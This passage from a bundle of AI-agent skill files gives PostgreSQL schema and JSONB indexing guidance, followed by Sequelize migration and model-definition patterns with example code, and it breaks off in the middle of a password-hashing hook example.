`crypt()` for password hashing.\n- **`uuid-ossp`**: alternative UUID functions; prefer `pgcrypto` for new projects.\n- **`pg_trgm`**: fuzzy text search with `%` operator, `similarity()` function. Index with GIN for `LIKE '%pattern%'` acceleration.\n- **`citext`**: case-insensitive text type. Prefer expression indexes on `LOWER(col)` unless you need case-insensitive constraints.\n- **`btree_gin`/`btree_gist`**: enable mixed-type indexes (e.g., GIN index on both JSONB and text columns).\n- **`hstore`**: key-value pairs; mostly superseded by JSONB but useful for simple string mappings.\n- **`timescaledb`**: essential for time-series—automated partitioning, retention, compression, continuous aggregates.\n- **`postgis`**: comprehensive geospatial support beyond basic geometric types—essential for location-based applications.\n- **`pgvector`**: vector similarity search for embeddings.\n- **`pgaudit`**: audit logging for all database activity.\n\n## JSONB Guidance\n\nPrefer `JSONB` with **GIN** index.\n\n### Default GIN Index\n```sql\nCREATE INDEX ON tbl USING GIN (jsonb_col);\n```\nAccelerates:\n- **Containment** `jsonb_col @> '{\"k\":\"v\"}'`\n- **Key existence** `jsonb_col ? 'k'`, **any/all keys** `?|`, `?&`\n- **Path containment** on nested docs\n- **Disjunction** `jsonb_col @> ANY(ARRAY['{\"status\":\"active\"}', '{\"status\":\"pending\"}'])`\n\n### For Heavy Containment Workloads\nConsider opclass `jsonb_path_ops` for smaller/faster containment-only indexes:\n```sql\nCREATE INDEX ON tbl USING GIN (jsonb_col jsonb_path_ops);\n```\n**Trade-off**: loses support for key existence (`?`, `?|`, `?&`) queries—only supports containment (`@>`)\n\n### Equality/Range on Specific Fields\nExtract and index with B-tree (generated column or expression):\n```sql\nALTER TABLE tbl ADD COLUMN price INT GENERATED ALWAYS AS ((jsonb_col->>'price')::INT) STORED;\nCREATE INDEX ON tbl (price);\n```\nPrefer queries like `WHERE price BETWEEN 100 AND 500` (uses B-tree) over `WHERE (jsonb_col->>'price')::INT BETWEEN 100 AND 500` without index.\n\n### Best Practices\n- Arrays inside JSONB: use GIN + `@>` for containment (e.g., tags). Consider `jsonb_path_ops` if only doing containment.\n- Keep core relations in tables; use JSONB for optional/variable attributes.\n- Use constraints to limit allowed JSONB values: `config JSONB NOT NULL CHECK(jsonb_typeof(config) = 'object')`\n\n## Examples\n\n### Users Table\n```sql\nCREATE TABLE users (\n  user_id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,\n  email TEXT NOT NULL UNIQUE,\n  name TEXT NOT NULL,\n  created_at TIMESTAMPTZ NOT NULL DEFAULT now()\n);\nCREATE UNIQUE INDEX ON users (LOWER(email));\nCREATE INDEX ON users (created_at);\n```\n\n### Orders Table\n```sql\nCREATE TABLE orders (\n  order_id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,\n  user_id BIGINT NOT NULL REFERENCES users(user_id),\n  status TEXT NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING','PAID','CANCELED')),\n  total NUMERIC(10,2) NOT NULL CHECK (total > 0),\n  created_at TIMESTAMPTZ NOT NULL DEFAULT now()\n);\nCREATE INDEX ON orders (user_id);\nCREATE INDEX ON orders (created_at);\n```\n\n### Profiles with JSONB\n```sql\nCREATE TABLE profiles (\n  user_id BIGINT PRIMARY KEY REFERENCES users(user_id),\n  attrs JSONB NOT NULL DEFAULT '{}',\n  theme TEXT GENERATED ALWAYS AS (attrs->>'theme') STORED\n);\nCREATE INDEX profiles_attrs_gin ON profiles USING GIN (attrs);\n```\n\n### E-commerce Domain Model\n```sql\n-- Customers with validation\nCREATE TABLE customers (\n    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,\n    email TEXT NOT NULL UNIQUE,\n    encrypted_password TEXT NOT NULL,\n    first_name TEXT NOT NULL,\n    last_name TEXT NOT NULL,\n    phone TEXT,\n    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),\n    updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),\n    is_active BOOLEAN NOT NULL DEFAULT true,\n\n    CONSTRAINT valid_email CHECK (email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$'),\n    CONSTRAINT valid_phone CHECK (phone IS NULL OR phone ~* '^\\+?[1-9]\\d{1,14}$')\n);\nCREATE UNIQUE INDEX ON customers (LOWER(email));\nCREATE INDEX ON customers (created_at);\n\n-- Products with inventory\nCREATE TABLE products (\n    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,\n    sku TEXT NOT NULL UNIQUE,\n    name TEXT NOT NULL,\n    description TEXT,\n    category_id BIGINT REFERENCES categories(id),\n    base_price NUMERIC(10,2) NOT NULL CHECK (base_price >= 0),\n    inventory_count INTEGER NOT NULL DEFAULT 0 CHECK (inventory_count >= 0),\n    is_active BOOLEAN NOT NULL DEFAULT true,\n    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),\n    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()\n);\nCREATE INDEX ON products (category_id);\nCREATE INDEX ON products (is_active) WHERE is_active = true;\n\n-- Orders with state machine\nCREATE TABLE orders (\n    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,\n    order_number TEXT NOT NULL UNIQUE,\n    customer_id BIGINT NOT NULL REFERENCES customers(id),\n    status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'confirmed', 'processing', 'shipped', 'delivered', 'cancelled', 'refunded')),\n    subtotal NUMERIC(10,2) NOT NULL CHECK (subtotal >= 0),\n    tax_amount NUMERIC(10,2) NOT NULL DEFAULT 0 CHECK (tax_amount >= 0),\n    shipping_amount NUMERIC(10,2) NOT NULL DEFAULT 0 CHECK (shipping_amount >= 0),\n    total_amount NUMERIC(10,2) NOT NULL CHECK (total_amount >= 0),\n    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),\n    updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),\n\n    CONSTRAINT valid_total CHECK (total_amount = subtotal + tax_amount + shipping_amount)\n);\nCREATE INDEX ON orders (customer_id);\nCREATE INDEX ON orders (status);\nCREATE INDEX ON orders (created_at);\n```"
              },
              {
                "name": "sequelize-migrations",
                "description": "Sequelize migration patterns and best practices for PostgreSQL schema changes. Use when creating migrations, modifying tables, managing indexes, or handling data migrations safely.",
                "path": "database-expert/skills/sequelize-migrations/SKILL.md",
                "frontmatter": {
                  "name": "sequelize-migrations",
                  "description": "Sequelize migration patterns and best practices for PostgreSQL schema changes. Use when creating migrations, modifying tables, managing indexes, or handling data migrations safely."
                },
                "content": "# Sequelize Migration Patterns\n\n## Migration Basics\n\n### File Structure\n```\nmigrations/\n├── 20240101000000-create-users.js\n├── 20240101000001-create-orders.js\n├── 20240102000000-add-status-to-users.js\n└── 20240103000000-add-index-to-orders.js\n```\n\n### Basic Migration Template\n```javascript\n'use strict';\n\n/** @type {import('sequelize-cli').Migration} */\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    // Forward migration\n  },\n\n  async down(queryInterface, Sequelize) {\n    // Rollback migration\n  },\n};\n```\n\n## Creating Tables\n\n### Basic Table Creation\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    await queryInterface.createTable('users', {\n      id: {\n        type: Sequelize.BIGINT,\n        primaryKey: true,\n        autoIncrement: true,\n      },\n      email: {\n        type: Sequelize.TEXT,\n        allowNull: false,\n        unique: true,\n      },\n      first_name: {\n        type: Sequelize.TEXT,\n        allowNull: false,\n      },\n      last_name: {\n        type: Sequelize.TEXT,\n        allowNull: false,\n      },\n      status: {\n        type: Sequelize.TEXT,\n        allowNull: false,\n        defaultValue: 'active',\n      },\n      metadata: {\n        type: Sequelize.JSONB,\n        allowNull: false,\n        defaultValue: {},\n      },\n      created_at: {\n        type: Sequelize.DATE,\n        allowNull: false,\n        defaultValue: Sequelize.literal('NOW()'),\n      },\n      updated_at: {\n        type: Sequelize.DATE,\n        allowNull: false,\n        defaultValue: Sequelize.literal('NOW()'),\n      },\n    });\n\n    // Add indexes after table creation\n    await queryInterface.addIndex('users', ['email'], { unique: true });\n    await queryInterface.addIndex('users', ['status']);\n    await queryInterface.addIndex('users', ['created_at']);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.dropTable('users');\n  },\n};\n```\n\n### Table with Foreign Keys\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    await queryInterface.createTable('orders', {\n      id: {\n        type: Sequelize.BIGINT,\n        primaryKey: true,\n        autoIncrement: true,\n      },\n      user_id: {\n        type: Sequelize.BIGINT,\n        allowNull: false,\n        references: {\n          model: 'users',\n          key: 'id',\n        },\n        onUpdate: 'CASCADE',\n        onDelete: 'CASCADE',\n      },\n      status: {\n        type: Sequelize.TEXT,\n        allowNull: false,\n        defaultValue: 'pending',\n      },\n      total: {\n        type: Sequelize.DECIMAL(10, 2),\n        allowNull: false,\n      },\n      created_at: {\n        type: Sequelize.DATE,\n        allowNull: false,\n        defaultValue: Sequelize.literal('NOW()'),\n      },\n      updated_at: {\n        type: Sequelize.DATE,\n        allowNull: false,\n        defaultValue: Sequelize.literal('NOW()'),\n      },\n    });\n\n    // CRITICAL: Index foreign key columns\n    await queryInterface.addIndex('orders', ['user_id']);\n    await queryInterface.addIndex('orders', ['status']);\n    await queryInterface.addIndex('orders', ['created_at']);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.dropTable('orders');\n  },\n};\n```\n\n## Adding Columns\n\n### Simple Column Addition\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    await queryInterface.addColumn('users', 'phone', {\n      type: Sequelize.TEXT,\n      allowNull: true,\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('users', 'phone');\n  },\n};\n```\n\n### Column with Default Value\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    // For non-volatile defaults, this is fast (no table rewrite)\n    await queryInterface.addColumn('users', 'is_verified', {\n      type: Sequelize.BOOLEAN,\n      allowNull: false,\n      defaultValue: false,\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('users', 'is_verified');\n  },\n};\n```\n\n### NOT NULL Column on Existing Table (Safe Pattern)\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    // Step 1: Add column as nullable\n    await queryInterface.addColumn('users', 'role', {\n      type: Sequelize.TEXT,\n      allowNull: true,\n    });\n\n    // Step 2: Backfill existing rows\n    await queryInterface.sequelize.query(`\n      UPDATE users SET role = 'user' WHERE role IS NULL\n    `);\n\n    // Step 3: Add NOT NULL constraint\n    await queryInterface.changeColumn('users', 'role', {\n      type: Sequelize.TEXT,\n      allowNull: false,\n      defaultValue: 'user',\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('users', 'role');\n  },\n};\n```\n\n## Modifying Columns\n\n### Change Column Type\n```javascript\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    // Note: May require USING clause for incompatible types\n    await queryInterface.changeColumn('products', 'price', {\n      type: Sequelize.DECIMAL(12, 2), // Expanding precision\n      allowNull: false,\n    });\n  },\n\n  async down(queryInterface, Sequelize) {\n    await queryInterface.changeColumn('products', 'price', {\n      type: Sequelize.DECIMAL(10, 2),\n      allowNull: false,\n    });\n  },\n};\n```\n\n### Change Column Type with USING\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // When types aren't directly compatible\n    await queryInterface.sequelize.query(`\n      ALTER TABLE products\n      ALTER COLUMN status TYPE INTEGER\n      USING CASE\n        WHEN status = 'active' THEN 1\n        WHEN status = 'inactive' THEN 0\n        ELSE -1\n      END\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      ALTER TABLE products\n      ALTER COLUMN status TYPE TEXT\n      USING CASE\n        WHEN status = 1 THEN 'active'\n        WHEN status = 0 THEN 'inactive'\n        ELSE 'unknown'\n      END\n    `);\n  },\n};\n```\n\n## Renaming\n\n### Rename Column\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.renameColumn('users', 'name', 'full_name');\n  },\n\n  async down(queryInterface) {\n    await queryInterface.renameColumn('users', 'full_name', 'name');\n  },\n};\n```\n\n### Rename Table\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.renameTable('users', 'accounts');\n  },\n\n  async down(queryInterface) {\n    await queryInterface.renameTable('accounts', 'users');\n  },\n};\n```\n\n## Index Management\n\n### Add Index\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // Simple index\n    await queryInterface.addIndex('orders', ['customer_id']);\n\n    // Named index\n    await queryInterface.addIndex('orders', ['status'], {\n      name: 'orders_status_idx',\n    });\n\n    // Unique index\n    await queryInterface.addIndex('users', ['email'], {\n      unique: true,\n      name: 'users_email_unique',\n    });\n\n    // Composite index\n    await queryInterface.addIndex('orders', ['customer_id', 'created_at']);\n\n    // Partial index\n    await queryInterface.addIndex('orders', ['customer_id'], {\n      where: { status: 'active' },\n      name: 'orders_active_customer_idx',\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeIndex('orders', 'orders_status_idx');\n    await queryInterface.removeIndex('users', 'users_email_unique');\n    await queryInterface.removeIndex('orders', ['customer_id', 'created_at']);\n    await queryInterface.removeIndex('orders', 'orders_active_customer_idx');\n  },\n};\n```\n\n### Concurrent Index Creation (No Lock)\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // CONCURRENTLY avoids locking the table during index creation\n    // CRITICAL: Cannot run in a transaction\n    await queryInterface.sequelize.query(`\n      CREATE INDEX CONCURRENTLY IF NOT EXISTS orders_customer_id_idx\n      ON orders (customer_id)\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      DROP INDEX CONCURRENTLY IF EXISTS orders_customer_id_idx\n    `);\n  },\n};\n```\n\n### GIN Index for JSONB\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.sequelize.query(`\n      CREATE INDEX users_metadata_gin ON users USING GIN (metadata)\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      DROP INDEX IF EXISTS users_metadata_gin\n    `);\n  },\n};\n```\n\n### Expression Index\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.sequelize.query(`\n      CREATE UNIQUE INDEX users_lower_email_idx ON users (LOWER(email))\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      DROP INDEX IF EXISTS users_lower_email_idx\n    `);\n  },\n};\n```\n\n## Constraints\n\n### Add Foreign Key\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.addConstraint('orders', {\n      fields: ['customer_id'],\n      type: 'foreign key',\n      name: 'orders_customer_id_fkey',\n      references: {\n        table: 'customers',\n        field: 'id',\n      },\n      onDelete: 'CASCADE',\n      onUpdate: 'CASCADE',\n    });\n\n    // Don't forget to index the FK column!\n    await queryInterface.addIndex('orders', ['customer_id']);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeConstraint('orders', 'orders_customer_id_fkey');\n    await queryInterface.removeIndex('orders', ['customer_id']);\n  },\n};\n```\n\n### Add Check Constraint\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.addConstraint('products', {\n      fields: ['price'],\n      type: 'check',\n      name: 'products_price_positive',\n      where: {\n        price: { [Sequelize.Op.gt]: 0 },\n      },\n    });\n\n    // Or with raw SQL for complex constraints\n    await queryInterface.sequelize.query(`\n      ALTER TABLE orders\n      ADD CONSTRAINT orders_status_valid\n      CHECK (status IN ('pending', 'confirmed', 'shipped', 'delivered', 'cancelled'))\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeConstraint('products', 'products_price_positive');\n    await queryInterface.removeConstraint('orders', 'orders_status_valid');\n  },\n};\n```\n\n### Add Unique Constraint\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.addConstraint('order_items', {\n      fields: ['order_id', 'product_id'],\n      type: 'unique',\n      name: 'order_items_order_product_unique',\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeConstraint('order_items', 'order_items_order_product_unique');\n  },\n};\n```\n\n## Data Migrations\n\n### Backfill Data\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // Batch update to avoid locking\n    const batchSize = 1000;\n    let affected = batchSize;\n\n    while (affected === batchSize) {\n      const [, result] = await queryInterface.sequelize.query(`\n        UPDATE users\n        SET normalized_email = LOWER(email)\n        WHERE id IN (\n          SELECT id FROM users\n          WHERE normalized_email IS NULL\n          LIMIT ${batchSize}\n        )\n      `);\n      affected = result.rowCount || 0;\n    }\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      UPDATE users SET normalized_email = NULL\n    `);\n  },\n};\n```\n\n### Copy Data Between Tables\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.sequelize.query(`\n      INSERT INTO user_profiles (user_id, bio, avatar_url, created_at)\n      SELECT id, bio, avatar_url, NOW()\n      FROM users\n      WHERE bio IS NOT NULL OR avatar_url IS NOT NULL\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(`\n      DELETE FROM user_profiles\n    `);\n  },\n};\n```\n\n## Enum Types\n\n### Create Enum Type\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.sequelize.query(`\n      CREATE TYPE order_status AS ENUM (\n        'pending', 'confirmed', 'processing', 'shipped', 'delivered', 'cancelled'\n      )\n    `);\n\n    await queryInterface.addColumn('orders', 'status_enum', {\n      type: 'order_status',\n      allowNull: false,\n      defaultValue: 'pending',\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('orders', 'status_enum');\n    await queryInterface.sequelize.query(`\n      DROP TYPE IF EXISTS order_status\n    `);\n  },\n};\n```\n\n### Add Value to Existing Enum\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // Add new value to enum (cannot be rolled back in PostgreSQL)\n    await queryInterface.sequelize.query(`\n      ALTER TYPE order_status ADD VALUE IF NOT EXISTS 'refunded'\n    `);\n  },\n\n  async down() {\n    // Cannot remove enum values in PostgreSQL\n    // Would need to recreate the type entirely\n    console.log('Warning: Cannot remove enum value. Manual intervention required.');\n  },\n};\n```\n\n## Transactions in Migrations\n\n### Automatic Transaction (Default)\nMost Sequelize CLI migrations run in a transaction automatically.\n\n### Disable Transaction for CONCURRENTLY\n```javascript\nmodule.exports = {\n  async up(queryInterface) {\n    // CREATE INDEX CONCURRENTLY cannot run in a transaction\n    await queryInterface.sequelize.query(\n      'CREATE INDEX CONCURRENTLY idx_users_email ON users (email)',\n      { transaction: null } // Disable transaction\n    );\n  },\n\n  async down(queryInterface) {\n    await queryInterface.sequelize.query(\n      'DROP INDEX CONCURRENTLY IF EXISTS idx_users_email',\n      { transaction: null }\n    );\n  },\n};\n```\n\n## Safe Migration Patterns\n\n### Zero-Downtime Column Removal\n```javascript\n// Step 1: Stop writing to the column (application change)\n// Step 2: Migration to remove column\n\nmodule.exports = {\n  async up(queryInterface) {\n    // First, drop any constraints\n    await queryInterface.removeConstraint('users', 'users_legacy_id_fkey').catch(() => {});\n\n    // Then drop the column\n    await queryInterface.removeColumn('users', 'legacy_id');\n  },\n\n  async down(queryInterface, Sequelize) {\n    await queryInterface.addColumn('users', 'legacy_id', {\n      type: Sequelize.INTEGER,\n      allowNull: true,\n    });\n  },\n};\n```\n\n### Add Column with Default (PostgreSQL 11+)\n```javascript\n// PostgreSQL 11+ handles default values without table rewrite\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    await queryInterface.addColumn('users', 'account_type', {\n      type: Sequelize.TEXT,\n      allowNull: false,\n      defaultValue: 'standard',\n    });\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('users', 'account_type');\n  },\n};\n```\n\n### Rename Column Safely (Two-Phase)\n```javascript\n// Phase 1: Add new column, copy data\nmodule.exports = {\n  async up(queryInterface, Sequelize) {\n    await queryInterface.addColumn('users', 'full_name', {\n      type: Sequelize.TEXT,\n      allowNull: true,\n    });\n\n    await queryInterface.sequelize.query(`\n      UPDATE users SET full_name = name WHERE full_name IS NULL\n    `);\n  },\n\n  async down(queryInterface) {\n    await queryInterface.removeColumn('users', 'full_name');\n  },\n};\n\n// Phase 2: (After application updated) Remove old column\nmodule.exports = {\n  async up(queryInterface) {\n    await queryInterface.removeColumn('users', 'name');\n  },\n\n  async down(queryInterface, Sequelize) {\n    await queryInterface.addColumn('users', 'name', {\n      type: Sequelize.TEXT,\n      allowNull: true,\n    });\n    await queryInterface.sequelize.query(`\n      UPDATE users SET name = full_name\n    `);\n  },\n};\n```\n\n## Sequelize CLI Commands\n\n```bash\n# Generate migration\nnpx sequelize-cli migration:generate --name add-phone-to-users\n\n# Run pending migrations\nnpx sequelize-cli db:migrate\n\n# Undo last migration\nnpx sequelize-cli db:migrate:undo\n\n# Undo all migrations\nnpx sequelize-cli db:migrate:undo:all\n\n# Undo to specific migration\nnpx sequelize-cli db:migrate:undo:all --to 20240101000000-create-users.js\n\n# Check migration status\nnpx sequelize-cli db:migrate:status\n```\n\n## Best Practices\n\n1. **Always write both up and down** - Enable rollback capability\n2. **Test migrations both ways** - Run up, then down, then up again\n3. **Use transactions** - Sequelize does this by default\n4. **Batch large data updates** - Avoid locking tables for extended periods\n5. **Index FK columns** - PostgreSQL doesn't auto-create these\n6. **Use CONCURRENTLY for production indexes** - Avoid blocking writes\n7. **Keep migrations small** - One logical change per migration\n8. **Don't modify old migrations** - Create new ones instead\n9. **Use raw SQL when needed** - Sequelize's API doesn't cover everything\n10. **Name constraints explicitly** - Makes them easier to remove later"
              },
              {
                "name": "sequelize-models",
                "description": "Sequelize ORM model definition patterns and best practices for PostgreSQL. Use when defining models, setting up associations, configuring validations, or optimizing Sequelize usage.",
                "path": "database-expert/skills/sequelize-models/SKILL.md",
                "frontmatter": {
                  "name": "sequelize-models",
                  "description": "Sequelize ORM model definition patterns and best practices for PostgreSQL. Use when defining models, setting up associations, configuring validations, or optimizing Sequelize usage."
                },
                "content": "# Sequelize Model Patterns\n\n## Model Definition\n\n### Basic Model Structure\n```javascript\nconst { DataTypes, Model } = require('sequelize');\n\nclass User extends Model {\n  // Instance methods\n  getFullName() {\n    return `${this.firstName} ${this.lastName}`;\n  }\n\n  // Class methods\n  static async findByEmail(email) {\n    return this.findOne({ where: { email: email.toLowerCase() } });\n  }\n}\n\nUser.init({\n  id: {\n    type: DataTypes.BIGINT,\n    primaryKey: true,\n    autoIncrement: true,\n  },\n  email: {\n    type: DataTypes.TEXT,\n    allowNull: false,\n    unique: true,\n    validate: {\n      isEmail: true,\n      notEmpty: true,\n    },\n    set(value) {\n      this.setDataValue('email', value.toLowerCase());\n    },\n  },\n  firstName: {\n    type: DataTypes.TEXT,\n    allowNull: false,\n    field: 'first_name', // Maps to snake_case column\n  },\n  lastName: {\n    type: DataTypes.TEXT,\n    allowNull: false,\n    field: 'last_name',\n  },\n  status: {\n    type: DataTypes.TEXT,\n    allowNull: false,\n    defaultValue: 'active',\n    validate: {\n      isIn: [['active', 'inactive', 'suspended']],\n    },\n  },\n  metadata: {\n    type: DataTypes.JSONB,\n    allowNull: false,\n    defaultValue: {},\n  },\n}, {\n  sequelize,\n  modelName: 'User',\n  tableName: 'users',\n  underscored: true, // Automatically use snake_case for columns\n  timestamps: true,  // Adds createdAt, updatedAt\n  paranoid: false,   // Set true for soft deletes (adds deletedAt)\n  indexes: [\n    { fields: ['email'], unique: true },\n    { fields: ['status'] },\n    { fields: ['created_at'] },\n  ],\n});\n\nmodule.exports = User;\n```\n\n## Data Type Mappings\n\n### PostgreSQL ↔ Sequelize\n\n| PostgreSQL | Sequelize DataType | Notes |\n|------------|-------------------|-------|\n| `BIGINT` | `DataTypes.BIGINT` | Use for IDs and large numbers |\n| `INTEGER` | `DataTypes.INTEGER` | Standard integers |\n| `NUMERIC(p,s)` | `DataTypes.DECIMAL(p,s)` | Money, precise decimals |\n| `DOUBLE PRECISION` | `DataTypes.DOUBLE` | Floating point |\n| `TEXT` | `DataTypes.TEXT` | Prefer over STRING/VARCHAR |\n| `BOOLEAN` | `DataTypes.BOOLEAN` | True/false |\n| `TIMESTAMPTZ` | `DataTypes.DATE` | Sequelize handles timezone |\n| `DATE` | `DataTypes.DATEONLY` | Date without time |\n| `JSONB` | `DataTypes.JSONB` | Structured JSON data |\n| `UUID` | `DataTypes.UUID` | Use with UUIDV4 default |\n| `TEXT[]` | `DataTypes.ARRAY(DataTypes.TEXT)` | Arrays |\n| `INET` | `DataTypes.INET` | IP addresses |\n| `CIDR` | `DataTypes.CIDR` | Network ranges |\n| `MACADDR` | `DataTypes.MACADDR` | MAC addresses |\n\n### ID Patterns\n```javascript\n// Auto-increment BIGINT (preferred)\nid: {\n  type: DataTypes.BIGINT,\n  primaryKey: true,\n  autoIncrement: true,\n}\n\n// UUID (when needed for distribution/opacity)\nid: {\n  type: DataTypes.UUID,\n  primaryKey: true,\n  defaultValue: DataTypes.UUIDV4,\n}\n```\n\n### Avoid These Mappings\n```javascript\n// BAD: VARCHAR/STRING - use TEXT instead\nname: DataTypes.STRING(255)  // Avoid\nname: DataTypes.TEXT         // Prefer\n\n// BAD: FLOAT for money\nprice: DataTypes.FLOAT       // Never\nprice: DataTypes.DECIMAL(10, 2)  // Always\n\n// BAD: DATE without timezone\ncreatedAt: DataTypes.DATE    // Actually OK - Sequelize uses TIMESTAMPTZ\n```\n\n## Associations\n\n### One-to-Many\n```javascript\n// User has many Orders\nUser.hasMany(Order, {\n  foreignKey: 'userId',\n  as: 'orders',\n  onDelete: 'CASCADE',\n});\n\nOrder.belongsTo(User, {\n  foreignKey: 'userId',\n  as: 'user',\n});\n\n// Usage\nconst user = await User.findByPk(1, {\n  include: [{ model: Order, as: 'orders' }],\n});\n\nconst order = await Order.findByPk(1, {\n  include: [{ model: User, as: 'user' }],\n});\n```\n\n### Many-to-Many\n```javascript\n// Products belong to many Categories through ProductCategories\nProduct.belongsToMany(Category, {\n  through: 'ProductCategories',\n  foreignKey: 'productId',\n  otherKey: 'categoryId',\n  as: 'categories',\n});\n\nCategory.belongsToMany(Product, {\n  through: 'ProductCategories',\n  foreignKey: 'categoryId',\n  otherKey: 'productId',\n  as: 'products',\n});\n\n// With junction table model (for extra fields)\nclass ProductCategory extends Model {}\nProductCategory.init({\n  productId: {\n    type: DataTypes.BIGINT,\n    primaryKey: true,\n  },\n  categoryId: {\n    type: DataTypes.BIGINT,\n    primaryKey: true,\n  },\n  sortOrder: {\n    type: DataTypes.INTEGER,\n    defaultValue: 0,\n  },\n}, { sequelize, modelName: 'ProductCategory', tableName: 'product_categories' });\n\nProduct.belongsToMany(Category, {\n  through: ProductCategory,\n  foreignKey: 'productId',\n  as: 'categories',\n});\n```\n\n### One-to-One\n```javascript\nUser.hasOne(Profile, {\n  foreignKey: 'userId',\n  as: 'profile',\n  onDelete: 'CASCADE',\n});\n\nProfile.belongsTo(User, {\n  foreignKey: 'userId',\n  as: 'user',\n});\n```\n\n### Self-Referential\n```javascript\n// Categories with parent/children\nCategory.hasMany(Category, {\n  foreignKey: 'parentId',\n  as: 'children',\n});\n\nCategory.belongsTo(Category, {\n  foreignKey: 'parentId',\n  as: 'parent',\n});\n\n// Hierarchical query\nconst category = await Category.findByPk(1, {\n  include: [\n    { model: Category, as: 'children' },\n    { model: Category, as: 'parent' },\n  ],\n});\n```\n\n## Validations\n\n### Built-in Validators\n```javascript\nemail: {\n  type: DataTypes.TEXT,\n  validate: {\n    isEmail: true,\n    notEmpty: true,\n  },\n},\nage: {\n  type: DataTypes.INTEGER,\n  validate: {\n    min: 0,\n    max: 150,\n    isInt: true,\n  },\n},\nwebsite: {\n  type: DataTypes.TEXT,\n  validate: {\n    isUrl: true,\n  },\n},\nstatus: {\n  type: DataTypes.TEXT,\n  validate: {\n    isIn: [['pending', 'active', 'completed']],\n  },\n},\nusername: {\n  type: DataTypes.TEXT,\n  validate: {\n    len: [3, 50],\n    isAlphanumeric: true,\n  },\n},\n```\n\n### Custom Validators\n```javascript\nprice: {\n  type: DataTypes.DECIMAL(10, 2),\n  validate: {\n    isPositive(value) {\n      if (parseFloat(value) <= 0) {\n        throw new Error('Price must be positive');\n      }\n    },\n  },\n},\nstartDate: {\n  type: DataTypes.DATE,\n  validate: {\n    isBeforeEndDate(value) {\n      if (this.endDate && value >= this.endDate) {\n        throw new Error('Start date must be before end date');\n      }\n    },\n  },\n},\n```\n\n### Model-Level Validation\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  modelName: 'User',\n  validate: {\n    bothNamesOrNone() {\n      if ((this.firstName === null) !== (this.lastName === null)) {\n        throw new Error('Either both names or neither');\n      }\n    },\n  },\n});\n```\n\n## Hooks\n\n### Available Hooks\n```javascript\nUser.init({\n  // ... attributes\n}, {\n  sequelize,\n  modelName: 'User',\n  hooks: {\n    // Before/After validation\n    beforeValidate: (user, options) => {},\n    afterValidate: (user, options) => {},\n\n    // Before/After create\n    beforeCreate: (user, options) => {},\n    afterCreate: (user, options) => {},\n\n    // Before/After update\n    beforeUpdate: (user, options) => {},\n    afterUpdate: (user, options) => {},\n\n    // Before/After save (create or update)\n    beforeSave: (user, options) => {},\n    afterSave: (user, options) => {},\n\n    // Before/After destroy\n    beforeDestroy: (user, options) => {},\n    afterDestroy: (user, options) => {},\n\n    // Bulk operations\n    beforeBulkCreate: (users, options) => {},\n    afterBulkCreate: (users, options) => {},\n    beforeBulkUpdate: (options) => {},\n    afterBulkUpdate: (options) => {},\n    beforeBulkDestroy: (options) => {},\n    afterBulkDestroy: (options) => {},\n  },\n});\n```\n\n### Common Hook Patterns\n```javascript\n// Auto-hash password\nbeforeCreate: async (user) => {\n  if (user.password) {\n    